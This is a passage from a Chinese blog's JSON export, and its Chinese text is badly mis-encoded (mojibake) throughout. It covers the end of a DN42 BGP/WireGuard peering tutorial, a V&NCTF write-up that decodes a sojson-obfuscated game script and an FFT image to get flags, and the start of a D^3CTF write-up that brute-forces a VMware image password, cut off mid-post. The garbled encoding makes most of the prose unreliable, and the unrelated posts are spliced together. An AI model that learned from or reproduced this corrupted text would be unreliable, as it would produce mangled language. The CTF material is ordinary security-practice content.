v4 å’Œ v6 ä¸¤æ¡ channelã€‚ï¼ˆå¤§æ¦‚æ„æ€æ˜¯è¿™æ ·ï¼Œä¸çŸ¥é“è¯´çš„å‡†ä¸å‡†ç¡® äºæ˜¯å¦‚æœåŒæ–¹éƒ½æ”¯æŒ MP-BGP çš„è¯ï¼Œä¸€èˆ¬æ˜¯ç”¨ link-local å»ºç«‹ä¸€æ¡ v6 çš„ BGP session å°±å¥½äº†ã€‚ ç”±äº link-local åªæ˜¯åœ¨è¿æ¥åŒæ–¹çš„æ¥å£è¿›è¡Œçš„ï¼Œéœ€è¦æŒ‡å®šå¥½æ¥å£ã€‚ å¯ä»¥å‚è€ƒ å–µå–µçš„æ¨¡æ¿ã€‚ protocol bgp dn42_424242xxxx_v6 from dnpeers { neighbor fe80::xxxx % 'wg_424242xxxx' as 424242xxxx; direct; } æ³¨æ„ fe80::xxxx æ˜¯å¯¹æ–¹çš„ link-local addressï¼Œwg_424242xxxx æ˜¯ä½ ç½‘ç»œæ¥å£çš„åå­—ã€‚ ä¹‹åå¯åŠ¨ BIRDï¼Œæˆ–è€…é‡æ–°åŠ è½½é…ç½®ã€‚ service bird start # å¦‚æœæ²¡å¯åŠ¨çš„è¯ birdc c # å³ birdc configure ç„¶åå¯ä»¥çœ‹çœ‹è¿æ¥çŠ¶æ€äº†ã€‚ birdc s p # å³ birdc show protocol å¦‚æœæ˜¾ç¤ºçš„æ˜¯ Establishedï¼Œé‚£ä¹ˆè¿æ¥å°±å»ºç«‹å¥½äº†ã€‚ Peer æˆåŠŸï¼ å½“ç„¶è¿˜å¯ä»¥æŸ¥çœ‹æŸæ¡è·¯ç”±é…ç½®çš„è¯¦ç»†ä¿¡æ¯ã€‚ birdc s p a dn42_424242xxxx_v6 # å³ birdc show protocol all dn42_424242xxxx_v6 ç„¶åå°±èƒ½ ping ä¸€ä¸‹ DN42 å†…çš„æœåŠ¡äº†ï¼Œæ¯”å¦‚ 172.20.0.53 ä¹‹ç±»çš„ã€‚ ä¸€ç‚¹ç‚¹æ‰©å±•2021.3.21 æ–°å‘å¸ƒçš„ BIRD v2.0.8 æ–°å¢äº†è®¸å¤šç‰¹æ€§ã€‚ å…¶ä¸­æœ‰ä¸€ä¸ªæ˜¯æ”¯æŒäº† extended next hopï¼Œå¯ä»¥å®ç° IPv4 æµé‡åœ¨ IPv6-only ç½‘ç»œä¸Šçš„è½¬å‘ã€‚ï¼ˆåæ­£ç¾¤å‹è¯´çš„æˆ‘ä¹Ÿæ‡’å¾—è€ƒè¯äº† å‚è€ƒ BIRD æ–‡æ¡£é‡Œçš„ BGP extended next hop åœ¨ dnpeers é‡Œçš„ ipv4 ä¸­åŠ å…¥ extended next hop on; å³å¯ä½¿ç”¨è¿™ä¸€ç‰¹æ€§ã€‚ äºæ˜¯å’Œåˆ«äºº peer çš„æ—¶å€™ï¼ŒWireGuard åªéœ€è¦ peer ä¸€ä¸ª IPv6 link-local address å°±å®Œäº‹äº†ï¼Œè¿ DN42 IPv4 éƒ½ä¸éœ€è¦äº†ã€‚ å½“ç„¶è¿˜éœ€è¦åŠ ä¸€ä¸ª dummy æ¥å£æ¥å†™æœ¬æœºçš„åœ°å€ï¼Œç±»ä¼¼äº ip link add dummy1 type dummy ip addr add &lt;ä½ çš„DN42 IPv4&gt;/32 dev dummy1 ip addr add &lt;ä½ çš„DN42 IPv6&gt;/128 dev dummy1 ä¸ç„¶è·¯ç”±è¡¨æœ‰å¯èƒ½å†™å…¥ä¸åˆ°å†…æ ¸ä¸­ã€‚ ä¸ºäº†æŒä¹…åŒ–ï¼Œéœ€è¦å†™åˆ°é…ç½®æ–‡ä»¶ä¸­ã€‚Ubuntu ä¸‹ç”¨çš„æ˜¯ netplanã€‚ åœ¨ /etc/netplan/ ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ã€‚ $ cat 01-dummy0.yaml network: version: 2 renderer: networkd bridges: dummy0: dhcp4: no dhcp6: no accept-ra: no interfaces: [ ] addresses: - &lt;ä½ çš„DN42 IPv4&gt;/32 - &lt;ä½ çš„DN42 IPv6&gt;/128 å…¶ä»–ç³»ç»Ÿçš„è¯å¯ä»¥é…ç½® /etc/network/interfacesã€‚ auto dummy0 iface dummy0 inet static pre-up ip link del dummy0 || true pre-up ip link add dummy0 type dummy || true address &lt;ä½ çš„DN42 IPv4&gt;/32 post-up ip addr add &lt;ä½ çš„DN42 IPv6&gt;/128 dev dummy0 ç„¶åé‡å¯ä¹‹åå°±èƒ½è‡ªåŠ¨é…ä¸Šè¿™ä¸ª dummy æ¥å£äº†ã€‚ BTWï¼Œå–µå–µè§‰å¾—ä¸€ä¸ªä¸€ä¸ªæ‰‹åŠ¨é…å¤ªéº»çƒ¦äº†ï¼Œäºæ˜¯è‡ªå·±ç”¨ Python ç³Šäº†ä¸ªå°è„šæœ¬ï¼Œåªéœ€è¦è¾“å…¥å¿…è¦çš„ä¿¡æ¯ï¼Œå°±èƒ½è‡ªåŠ¨ç”Ÿæˆé…ç½®æ–‡ä»¶ï¼Œå¹¶å»ºç«‹ WireGuard è¿æ¥ï¼Œé‡æ–°åŠ è½½ BIRD é…ç½®äº†ï¼Œè´¼èˆ’æœï¼ ï¼ˆä¸è¿‡è„šæœ¬å¤ªä¸‘äº†è€Œä¸”æ˜¯è‡ªå·±ç”¨çš„ï¼Œå°±ä¸æ”¾å‡ºæ¥äº†å§ 0x07 ä¸€äº›å¥½ç©çš„ä¸œè¥¿å¤§ä½¬ä»¬ç»™èŠ‚ç‚¹åšäº†å¯è§†åŒ–ï¼Œæ¯”å¦‚ä»¥ä¸‹å‡ ä¸ªã€‚ https://map42.0x7f.cc/ https://map.meson.cc/ https://nixnodes.net/dn42/graph/ https://bgp42.strexp.net/map2 å•Šå•Šå•Šï¼Œæ¯›çº¿å¥½å¤šç¼ ä½å–µå–µäº†ï¼ˆå¤§é›¾ å½“ç„¶è¿˜æœ‰å¾ˆå¤š dn42 / NeoNetwork NOC çš„ looking glassï¼Œæ¯”å¦‚ï¼š https://lg.burble.com/ https://lg.strexp.net/ https://lg.lantian.pub/ https://lg.lss233.com/ ä»¥åŠ DN42 é‡Œçš„æœåŠ¡ internal/Internal Services Burble è€å¸ˆçš„æœåŠ¡ https://dn42.burble.com/services/public/ å½“ç„¶è¿˜å¯ä»¥ç»‘å®š .dn42 åŸŸåï¼Œè®¾ç½®åå‘è§£æ rDNSï¼Œå½“ç„¶è¿˜æœ‰ .dn42 çš„ CA è¯ä¹¦â€¦â€¦ ä¸ºäº†ç»™è‡ªå·±çš„å¤šä¸ªè®¾å¤‡ç»„ç½‘ï¼Œè¿˜å¯ä»¥ iBGPã€iGPã€Babelã€OSPF ç­‰è·¯ç”±åè®®ç»¼åˆæ¥ä½¿ç”¨ã€‚ åæ­£è¿˜èƒ½æ…¢æ…¢ç©å‘¢ï¼ˆ 0x08 Peer with MeowNetä»€ä¹ˆï¼Ÿä½ æƒ³å’Œæˆ‘ Peer äº†ï¼Ÿå¿«æ¥ Peerï¼ AS4242422688MeowNetMiaoTonyâ€™s DN42 Network DN42 IP: 172.23.6.0/26fd00:feed:ca7::/48 Nodes: LAS1 - Las Vegas, US, BuyVM To be continuedâ€¦ WireGuard and Multiprotocol BGP are preferred. I prefer to use link-local IPv6 address to set up multiprotocol BGP session (with extended next hop enabled). Welcome to peer with me! Telegram: (Recommended) Just PM @meow_portal_bot and tell me you are from DN42. Email: dn42@miaotony.xyz You should send me some info like follows. Your ASN Public IP IPv4 is preferred, but you can send v4/v6 both DN42 IPv4 and IPv6 Link-local address is preferred Your WireGuard Port 22688 by default I will use 2&lt;Your last 4-digit ASN&gt; for you Is Multiprotocol BGP supported? If yes, I will just use the link-local IPv6 address to set up v4+v6 BGP session Yes by default Something else you want to share with me Extended next hop enabled? etc. æˆ–è€…çœ‹ä¸‹é¢ä¹Ÿè¡Œã€‚ 0x09 å°ç»“è¿™ç¯‡æ–‡ç« å¯¹ç”³è¯· ASNã€IPã€åŸŸåï¼Œæ­å»º VPN é€šä¿¡éš§é“ï¼Œé…ç½® BGP è·¯ç”±ï¼Œå®Œæˆå’Œå…¶ä»–ç½‘ç»œçš„ Peer ç­‰å†…å®¹è¿›è¡Œäº†ä»‹ç»ã€‚ ä½†è¦æ³¨æ„çš„æ˜¯æœ¬æ–‡å¹¶ä¸æ˜¯ä¸€ç¯‡å®Œæ•´çš„ä»‹ç»ï¼Œè¿˜éœ€è¦å‚è€ƒå…¶ä»–æ•™ç¨‹æ¥ç»¼åˆè¿›è¡Œé…ç½®ã€‚ ä¸è¿‡åˆšæ¥ç© DN42ï¼Œè¿˜æœ‰å¾ˆå¤šä¸ç†Ÿæ‚‰çš„åœ°æ–¹ï¼Œè¿˜å¾—æ„Ÿè°¢ç¾¤é‡Œçš„å¤§ä½¬ä»¬ Orzã€‚ å¦‚æœæœ‰é”™è¯¯æ¬¢è¿æŒ‡å‡ºï¼Œå–µï¼ 0xFF References &amp; Extensive Reading DN42 å®˜æ–¹ Wiki howto/Getting Started Lan Tian å¸ˆç¥–çš„ DN42 å®éªŒç½‘ç»œä»‹ç»åŠæ³¨å†Œæ•™ç¨‹ï¼ˆ2020-10-01 æ›´æ–°ï¼‰ æ¥å…¥ dn42 åŠ NeoNetwork è¾£æ¡â‘ å· çš„ DN42 ç³»åˆ— ä»€éº¼ï¼Œé€éBGPå¾å°å‹ç¶²è·¯åˆ°çœŸæ­£çš„ç¶²éš›ç¶²è·¯ï¼ï¼Ÿ ç³»åˆ— BIRD ä¸ BGP çš„æ–°æ‰‹å¼€åœº iBGP - BGP within AS4242423905 etc. å–µå‘œï¼ç»ˆäºæ‰¯å®Œè¿™ç¯‡æ–‡ç« äº†ï¼ å¥½ä¹…æ²¡å†™æŠ€æœ¯æ–‡ç« äº†ï¼Œå–µå–µç´¯æ­»äº†ï¼ˆ ï¼ˆæºœäº†å–µ","path":"2021/03/25/Server_DN42/"},{"title":"CTF | 2021 V&NCTF å…¬å¼€èµ› WriteUp","text":"å¼•è¨€ V&amp;NCTF2021 å…¬å¼€èµ› https://buuoj.cn/vnctf_2021 æ¯”èµ›æ—¶é—´ï¼š3æœˆ14æ—¥10:00 - 3æœˆ14æ—¥ 22:00é¢˜ç›®åˆ†ç±»ï¼šWeb Pwn Re Misc Crypto BlockChain EGGé¢˜ç›®éš¾åº¦ï¼šç®€å•çš„ç­¾åˆ°æ¯”èµ›ç±»å‹ï¼šä¸ªäººèµ›æ¯”èµ›åœ°ç‚¹ï¼šBUUOJ å‘¨æœ«æœ‰ä¸ª V&amp;NCTFï¼Œé¢˜ç›®æ˜¯ V&amp;N æˆ˜é˜Ÿä¸­å¤§ä¸€å¤§äºŒçš„å°å¸ˆå‚…ä»¬å‡ºçš„ï¼Œæ¯”èµ›ç»“æŸå‰æ¥çœ‹äº†ä¸€çœ¼ï¼Œåšäº†å‡ ä¸ªé¢˜ç©ç©ã€‚ è¿™ç¯‡å…¶å®å°±å¾ˆæ°´äº† 2333. Miscå†°å†°å¥½åƒè—ç€ç§˜å¯† å‘ç°å†°å†°è—ç€çš„flagï¼Œflagæ ¼å¼ä¸ºVNCTF{*} ä¸‹è½½ä¸‹æ¥ä¸€ä¸ª FFT.rar å‘ç°æ‰“ä¸å¼€ã€‚ æœ¬æ¥æƒ³ä¿®ä¸€ä¸‹çš„ï¼Œå‘ç°ç”¨ WINRAR èƒ½æ­£å¸¸æ‰“å¼€é‡Œé¢çš„å›¾ç‰‡ï¼Œè¿˜èƒ½æå–å‡ºæ¥ï¼Œé‚£å°±æ‡’äº†ï¼ˆè·‘ ç„¶å fft è½¬æ¢åˆ°é¢‘åŸŸå°±èƒ½çœ‹åˆ° flagã€‚ clc;clear;close all; im = double(imread('FFT.png'))/255; F=fft2(im); imshow(F); è¿™é‡Œè¿˜æ²¡æœ‰åš fftshiftï¼Œä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œflag ä¹Ÿèƒ½å‡ºäº†ã€‚ VNCTF{Ff5_1S_bEauTiful} WebEz_gameè¿™é¢˜æ¯”èµ›ç»“æŸå‰å‡ åˆ†é’Ÿæ¥çœ‹äº†çœ‹ï¼ˆ game.js è¿™é‡Œæœ‰ä¸€æ®µ sojson åŠ å¯†çš„ã€‚ ['sojson.v4'][\"\\x66\\x69\\x6c\\x74\\x65\\x72\"][\"\\x63\\x6f\\x6e\\x73\\x74\\x72\\x75\\x63\\x74\\x6f\\x72\"](((['sojson.v4']+[])[\"\\x63\\x6f\\x6e\\x73\\x74\\x72\\x75\\x63\\x74\\x6f\\x72\"]['\\x66\\x72\\x6f\\x6d\\x43\\x68\\x61\\x72\\x43\\x6f\\x64\\x65']['\\x61\\x70\\x70\\x6c\\x79'](null,\"118h97x114w32l95m95N101x110O99d111B100u101w32F61P32u39R106k115w106O105F97z109R105f46p99y111A109U39d44F10G32U32F32r32G95V97p32D61Y32X123W125h44r10M32V32P32x32h95X48M120O98J52A56I51A32r61d32v91o34Q95c100n101M99e111I100l101I34b44r32X34r104N116Z116m112B58A47b47P119M119d119M46z115W111I106V115f111s110m46J99D111W109Z47g106R97c118D97F115L99I114Y105F112v116E111l98m102Q117d115E99x97K116r111U114v46s104d116B109F108Z34e93B59q10m40r102O117f110Z99D116D105a111a110u40Y95J48O120H100Q54k52k50e120I49a41P32f123s10E32j32I32d32K95E48D120k100R54S52g50O120H49y91J95q48X120w98C52a56R51E91m48B93c93E32d61e32w95X48v120b98L52e56b51O91m49b93C10Q125V41N40t95r97g41L59X10M118d97I114t32E95f95x79y120f97D50O55p56y49X32I61j32A91K34i34t44h32L34a45m112w97p117H115M101E100z45m34r44g32Q34y87v105k110E33A32h102S108G97y103u123E116k104V105l115E95F103u97g109Y101I95l105R115A95x102G117h110l110E121M33B125f34N44c32q34f71C97L109O101x32c79k118R101J114R33b34L44V32h34U80g114e101b115c115t32c69w115I99g97u112W101z34C44h32d34a120f34k44B32W34i121H34q44x32P34E99x101x110k116J101Z114j34c44B32s34B117V110j100K101A102U105M110L101x100T34k44u32U34R108t111X103q34W44p32M34o21024U38500O34R44T32u34a29256O26412t21495E65292k106N115v20250y23450F34N44f32V34Q26399e24377C31383B65292R34u44t32j34y36824A35831C25903t25345D25105o20204W30340R24037P20316L34R44y32w34o106Z115A106T105F97b34i44a32m34u109T105L46e99p111F109l34U93m59Y10u108S101q116s32P98f105A103l84N101h120n116V32A61B32t95V95W79u120a97z50N55J56g49r91g48C120L48a93r59K10k105U102S32K40X112d97m117q115P101T100A41S32r123R10r32D32a32X32t98Y105Y103N84I101p120j116U32e61J32R95g95v79i120F97F50n55h56H49d91S48x120N49u93H10C125z59O10C105W102e32t40G119n105T110x84r105G109Y101W114q46C73s115m83G101O116j40m41O41R32S123R10c32I32b32A32V98x105X103v84E101b120V116V32L61P32N95e95u79I120v97W50T55W56i49S91j48m120O50d93k10g125J59G10Q105p102m32Y40O112J108s97c121w101U114u46P73a115D68E101Y97D100E40g41g41Q32Y123r10K32X32T32q32r98b105q103i84o101V120D116v32N61H32b95R95J79q120i97q50X55o56g49G91T48Z120F51G93l59k10c32v32f32e32P68u114l97N119q84f101x120z116m40j95r95I79n120R97E50x55o56h49y91p48Q120z52L93g44k32E109H97Q105E110w67Z97l110d118S97M115j83a105B122j101E91p95n95Y79U120S97H50C55a56l49E91z48w120A53C93Y93I32b47M32o50R44R32w109n97U105b110j67h97M110H118j97X115g83D105M122n101W91J95q95y79x120i97R50Y55z56s49N91z48v120R54s93a93S32I47z32A50k32w43S32f56j48j44T32B52Y50c41O10V125M59f10h68n114V97m119f84G101C120P116u40E98i105M103U84C101e120d116q44f32Z109v97i105R110G67u97m110Q118e97n115K83G105V122M101j91Q95Y95y79M120f97G50k55i56C49c91x48j120R53F93a93L32b47p32Z50k44a32l109c97r105A110W67i97Y110t118H97y115J83H105C122r101R91a95L95s79a120d97M50G55H56k49O91m48p120R54y93d93J32x47y32c50c32Y45d32C56M48i44r32b55G50f44j32x95j95r79S120i97g50J55V56a49a91Y48f120w55c93M44M32s50p41D59x59h59g10r40L102e117n110g99S116k105D111t110Y40M95J48s120f53y49N57K55H120Y50z44F32z95B48b120t53z49A57D55X120n51H44w32o95P48t120g53n49M57G55n120T52U44D32B95A48B120Z53K49H57t55X120d53L44f32o95J48R120D53s49H57d55J120b54Y44w32U95u48g120J53Q49v57B55s120a55H41z32L123K10G32X32F32V32W95k48o120T53S49I57d55s120i55d32O61X32n95B95n79d120E97E50s55o56w49j91N48z120D56R93R59j10p32Q32s32e32H95F48O120Y53F49C57W55r120q53M32f61U32Y102R117F110N99c116V105r111y110w40I95X48h120s53Y49o57q55k120o56Q41f32S123S10R32C32B32t32f32r32q32F32Z105Y102S32o40c116E121R112d101G111f102m32p97d108Q101M114s116V32G33s61C61z32B95p48W120e53S49y57p55Q120C55o41q32L123z10I32u32a32y32W32e32b32h32W32s32m32l32c97I108C101N114t116V40P95w48X120x53F49M57d55B120x56u41F10C32F32A32B32h32F32r32y32w125L59G10o32f32T32O32T32O32c32H32D105d102v32H40i116V121a112R101e111G102B32D99O111n110L115o111X108W101S32D33C61H61G32o95u48e120z53k49d57j55s120E55m41p32c123o10V32I32B32R32A32Y32N32H32E32R32l32V32P99D111R110i115r111m108h101D91Z95i95s79g120K97d50W55w56r49n91E48l120W57W93F93R40P95D48G120q53Q49d57p55q120M56R41F10q32C32N32u32X32T32E32d32X125W10D32P32h32i32Y125N59D10v32J32C32X32B95V48w120K53C49I57r55I120E52C32Q61E32X102o117o110I99u116M105C111z110h40v95g48L120b53d49q57e55J120L57j44C32F95R48X120M53S49U57w55h120I50w41W32r123j10q32e32k32e32y32Z32I32g32z114c101D116A117A114V110w32x95p48H120k53O49r57b55Z120w57Q32N43M32A95I48z120M53A49S57s55K120o50o10u32y32k32j32u125a59j10u32S32S32n32p95A48s120k53a49M57F55J120J54G32c61R32l95c48X120C53s49q57U55V120E52N40A95t95T79x120Q97R50o55F56e49Y91i48G120p97P93y44S32J95k48r120q53g49i57E55x120D52O40N95H48S120d53i49M57H55x120e52e40X95k95Z79q120C97l50T55K56I49k91R48o120g98g93Q44v32r95R95K79W120N97u50A55v56Z49m91A48x120X99H93x41y44T32w95n95v79i120g97E50y55h56m49C91X48S120N100w93n41q41b59M10I32e32F32g32e116J114t121I32r123N10M32J32N32m32j32l32J32g32X95n48g120l53X49b57l55D120p50s32b61T32f95W95E101N110o99c111M100M101Q59f10J32k32y32K32B32F32X32R32K105d102c32b40e33U40o116q121j112D101A111D102c32x95p48o120R53a49b57S55d120M50d32p33q61s61o32d95z48B120A53s49S57t55a120j55H32B38S38e32N95i48L120O53j49W57O55V120P50X32o61Y61i61k32P95j48M120Z53O49t57W55P120p52V40d95N95y79a120X97r50t55o56v49a91I48m120m101p93B44T32V95b95j79s120M97q50p55j56G49A91g48i120O102U93G41y41a41i32F123F10O32Z32o32T32P32e32Z32K32T32h32z32d32b95l48V120H53v49J57I55L120w53J40n95M48o120F53C49d57W55e120S54R41U10U32u32C32c32x32z32y32J32F125L10H32K32G32r32d125e32A99A97l116x99y104R32H40B101U41W32j123A10m32t32b32L32A32A32B32D32Z95t48z120m53V49N57N55B120x53Z40m95k48c120A53L49M57V55R120l54U41X10E32R32G32Q32q125U10D125p41P40A123E125S41\"['\\x73\\x70\\x6c\\x69\\x74'](/[a-zA-Z]{1,}/))))('sojson.v4'); æ¥ https://www.sojson.com/jsjiemi.html æˆ–è€… https://tool.lu/js è¿™é‡Œè§£å¯†ä¸€ä¸‹ï¼Œå…¶å®å°±æ˜¯è§£ç äº†ä¸€ä¸‹ï¼ˆ ['sojson.v4'][\"filter\"][\"constructor\"](((['sojson.v4'] + [])[\"constructor\"]['fromCharCode']['apply'](null, \"118h97x114w32l95m95N101x110O99d111B100u101w32F61P32u39R106k115w106O105F97z109R105f46p99y111A109U39d44F10G32U32F32r32G95V97p32D61Y32X123W125h44r10M32V32P32x32h95X48M120O98J52A56I51A32r61d32v91o34Q95c100n101M99e111I100l101I34b44r32X34r104N116Z116m112B58A47b47P119M119d119M46z115W111I106V115f111s110m46J99D111W109Z47g106R97c118D97F115L99I114Y105F112v116E111l98m102Q117d115E99x97K116r111U114v46s104d116B109F108Z34e93B59q10m40r102O117f110Z99D116D105a111a110u40Y95J48O120H100Q54k52k50e120I49a41P32f123s10E32j32I32d32K95E48D120k100R54S52g50O120H49y91J95q48X120w98C52a56R51E91m48B93c93E32d61e32w95X48v120b98L52e56b51O91m49b93C10Q125V41N40t95r97g41L59X10M118d97I114t32E95f95x79y120f97D50O55p56y49X32I61j32A91K34i34t44h32L34a45m112w97p117H115M101E100z45m34r44g32Q34y87v105k110E33A32h102S108G97y103u123E116k104V105l115E95F103u97g109Y101I95l105R115A95x102G117h110l110E121M33B125f34N44c32q34f71C97L109O101x32c79k118R101J114R33b34L44V32h34U80g114e101b115c115t32c69w115I99g97u112W101z34C44h32d34a120f34k44B32W34i121H34q44x32P34E99x101x110k116J101Z114j34c44B32s34B117V110j100K101A102U105M110L101x100T34k44u32U34R108t111X103q34W44p32M34o21024U38500O34R44T32u34a29256O26412t21495E65292k106N115v20250y23450F34N44f32V34Q26399e24377C31383B65292R34u44t32j34y36824A35831C25903t25345D25105o20204W30340R24037P20316L34R44y32w34o106Z115A106T105F97b34i44a32m34u109T105L46e99p111F109l34U93m59Y10u108S101q116s32P98f105A103l84N101h120n116V32A61B32t95V95W79u120a97z50N55J56g49r91g48C120L48a93r59K10k105U102S32K40X112d97m117q115P101T100A41S32r123R10r32D32a32X32t98Y105Y103N84I101p120j116U32e61J32R95g95v79i120F97F50n55h56H49d91S48x120N49u93H10C125z59O10C105W102e32t40G119n105T110x84r105G109Y101W114q46C73s115m83G101O116j40m41O41R32S123R10c32I32b32A32V98x105X103v84E101b120V116V32L61P32N95e95u79I120v97W50T55W56i49S91j48m120O50d93k10g125J59G10Q105p102m32Y40O112J108s97c121w101U114u46P73a115D68E101Y97D100E40g41g41Q32Y123r10K32X32T32q32r98b105q103i84o101V120D116v32N61H32b95R95J79q120i97q50X55o56g49G91T48Z120F51G93l59k10c32v32f32e32P68u114l97N119q84f101x120z116m40j95r95I79n120R97E50x55o56h49y91p48Q120z52L93g44k32E109H97Q105E110w67Z97l110d118S97M115j83a105B122j101E91p95n95Y79U120S97H50C55a56l49E91z48w120A53C93Y93I32b47M32o50R44R32w109n97U105b110j67h97M110H118j97X115g83D105M122n101W91J95q95y79x120i97R50Y55z56s49N91z48v120R54s93a93S32I47z32A50k32w43S32f56j48j44T32B52Y50c41O10V125M59f10h68n114V97m119f84G101C120P116u40E98i105M103U84C101e120d116q44f32Z109v97i105R110G67u97m110Q118e97n115K83G105V122M101j91Q95Y95y79M120f97G50k55i56C49c91x48j120R53F93a93L32b47p32Z50k44a32l109c97r105A110W67i97Y110t118H97y115J83H105C122r101R91a95L95s79a120d97M50G55H56k49O91m48p120R54y93d93J32x47y32c50c32Y45d32C56M48i44r32b55G50f44j32x95j95r79S120i97g50J55V56a49a91Y48f120w55c93M44M32s50p41D59x59h59g10r40L102e117n110g99S116k105D111t110Y40M95J48s120f53y49N57K55H120Y50z44F32z95B48b120t53z49A57D55X120n51H44w32o95P48t120g53n49M57G55n120T52U44D32B95A48B120Z53K49H57t55X120d53L44f32o95J48R120D53s49H57d55J120b54Y44w32U95u48g120J53Q49v57B55s120a55H41z32L123K10G32X32F32V32W95k48o120T53S49I57d55s120i55d32O61X32n95B95n79d120E97E50s55o56w49j91N48z120D56R93R59j10p32Q32s32e32H95F48O120Y53F49C57W55r120q53M32f61U32Y102R117F110N99c116V105r111y110w40I95X48h120s53Y49o57q55k120o56Q41f32S123S10R32C32B32t32f32r32q32F32Z105Y102S32o40c116E121R112d101G111f102m32p97d108Q101M114s116V32G33s61C61z32B95p48W120e53S49y57p55Q120C55o41q32L123z10I32u32a32y32W32e32b32h32W32s32m32l32c97I108C101N114t116V40P95w48X120x53F49M57d55B120x56u41F10C32F32A32B32h32F32r32y32w125L59G10o32f32T32O32T32O32c32H32D105d102v32H40i116V121a112R101e111G102B32D99O111n110L115o111X108W101S32D33C61H61G32o95u48e120z53k49d57j55s120E55m41p32c123o10V32I32B32R32A32Y32N32H32E32R32l32V32P99D111R110i115r111m108h101D91Z95i95s79g120K97d50W55w56r49n91E48l120W57W93F93R40P95D48G120q53Q49d57p55q120M56R41F10q32C32N32u32X32T32E32d32X125W10D32P32h32i32Y125N59D10v32J32C32X32B95V48w120K53C49I57r55I120E52C32Q61E32X102o117o110I99u116M105C111z110h40v95g48L120b53d49q57e55J120L57j44C32F95R48X120M53S49U57w55h120I50w41W32r123j10q32e32k32e32y32Z32I32g32z114c101D116A117A114V110w32x95p48H120k53O49r57b55Z120w57Q32N43M32A95I48z120M53A49S57s55K120o50o10u32y32k32j32u125a59j10u32S32S32n32p95A48s120k53a49M57F55J120J54G32c61R32l95c48X120C53s49q57U55V120E52N40A95t95T79x120Q97R50o55F56e49Y91i48G120p97P93y44S32J95k48r120q53g49i57E55x120D52O40N95H48S120d53i49M57H55x120e52e40X95k95Z79q120C97l50T55K56I49k91R48o120g98g93Q44v32r95R95K79W120N97u50A55v56Z49m91A48x120X99H93x41y44T32w95n95v79i120g97E50y55h56m49C91X48S120N100w93n41q41b59M10I32e32F32g32e116J114t121I32r123N10M32J32N32m32j32l32J32g32X95n48g120l53X49b57l55D120p50s32b61T32f95W95E101N110o99c111M100M101Q59f10J32k32y32K32B32F32X32R32K105d102c32b40e33U40o116q121j112D101A111D102c32x95p48o120R53a49b57S55d120M50d32p33q61s61o32d95z48B120A53s49S57t55a120j55H32B38S38e32N95i48L120O53j49W57O55V120P50X32o61Y61i61k32P95j48M120Z53O49t57W55P120p52V40d95N95y79a120X97r50t55o56v49a91I48m120m101p93B44T32V95b95j79s120M97q50p55j56G49A91g48i120O102U93G41y41a41i32F123F10O32Z32o32T32P32e32Z32K32T32h32z32d32b95l48V120H53v49J57I55L120w53J40n95M48o120F53C49d57W55e120S54R41U10U32u32C32c32x32z32y32J32F125L10H32K32G32r32d125e32A99A97l116x99y104R32H40B101U41W32j123A10m32t32b32L32A32A32B32D32Z95t48z120m53V49N57N55B120x53Z40m95k48c120A53L49M57V55R120l54U41X10E32R32G32Q32q125U10D125p41P40A123E125S41\" ['split'](/[a-zA-Z]{1,}/))))('sojson.v4'); ç›´æ¥åœ¨ console é‡ŒæŠŠæœ€åçš„ ('sojson.v4'); å»æ‰ï¼Œç„¶åæ‰§è¡Œå°±èƒ½åœ¨ sources é‡Œçœ‹åˆ°æºç ã€‚ å¾ˆæ˜æ˜¾å°±çœ‹åˆ° flag äº†ã€‚ flag{this_game_is_funny!} å°ç»“å…¶å®å°±éšæ„çœ‹äº†çœ‹é¢˜ï¼Œè¿™ç¯‡æ–‡ç« å½“æ°´ä¸€æ°´å¥½äº†ã€‚ ï¼ˆç”šè‡³èººåœ¨è‰ç¨¿ç®±é‡Œé•¿è‰äº†ï¼Œè¿˜æ²¡å‘ å‘äº†å‘äº†ã€‚ ï¼ˆæºœäº†æºœäº†å–µ","path":"2021/03/15/CTF_2021VNCTF/"},{"title":"CTF | 2021 AntCTF x D^3CTF WriteUp","text":"å¼•è¨€2021 AntCTF x D^3CTF AntCTF x D^3CTF æ˜¯èš‚èšé›†å›¢å®‰å…¨å“åº”ä¸­å¿ƒï¼ˆAntSRCï¼‰æºæ‰‹ä¸‰æ”¯â€œç”µå­ç§‘å¤§â€é˜Ÿä¼ï¼šæ­ç”µ Vidar-Teamã€è¥¿ç”µ L-Team åŠæˆç”µ CNSS å…±åŒä¸¾åŠçš„ CTF èµ›äº‹ï¼ˆæš¨ç¬¬åäºŒå±Š HCTFã€ç¬¬äº”å±Š LCTFï¼‰ çº¿ä¸Šèµ› 3æœˆ5æ—¥ 20:00ï¼3æœˆ7æ—¥ 20:00 ä»‹ç»é¡µé¢ï¼š https://d3ctf.io/ æ¯”èµ›å¹³å°ï¼š https://ant-d3ctf.alipay.com/ å‰ä¸ä¹…çœ‹ç¾¤é‡Œå¸ˆå‚…æ¨äº†è¿™ä¸ªæ¯”èµ›ï¼Œå°±æ¥æ‰“æ‰“ç©ç©å¥½äº†ã€‚ æ¯”èµ›é¢˜ç›®æ”¾å‡ºæ¥æ‰å‘ç°è¿˜æ˜¯æŒºæœ‰éš¾åº¦çš„ï¼Œäºæ˜¯å–µå–µä¹Ÿä¸ä¼šåšï¼Œå¤§å“­å‘œå‘œå‘œã€‚ å’Œé˜Ÿé‡Œå¸ˆå‚…ä¸€èµ·æ‰“çš„ï¼Œè¿™é‡Œå°±ç®€å•å†™å†™æˆ‘åšçš„å§ã€‚ MiscVirtual Love You say you love me, but you donâ€™t know me at all! Your loveâ€¦Your love is all virtual!ï¼ˆLogin User: guestï¼‰The second part of the attachmentï¼šhttps://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLove_7992f13b4b66efb5156f17698f69c0e3.part2.rarFlag Format: d3ctf{this_is_a_sample_flag} https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLove_7992f13b4b66efb5156f17698f69c0e3.part1.rar å¥½å®¶ä¼™ï¼Œ6GiB çš„ Vmware è™šæ‹Ÿæœºé•œåƒï¼ è§£å‹å‡ºæ¥å¯¼å…¥ Vmwareï¼Œå‘ç°éœ€è¦å¯†ç ã€‚ ç¬¬ä¸€æ¬¡é‡åˆ°è¿™ç§é¢˜å”‰ï¼Œäºæ˜¯æƒ³åˆ°çˆ†ç ´è¿™ä¸ªå¯†ç ã€‚ GitHub ä¸Šæ‰¾åˆ°äº† pyvmx-cracker 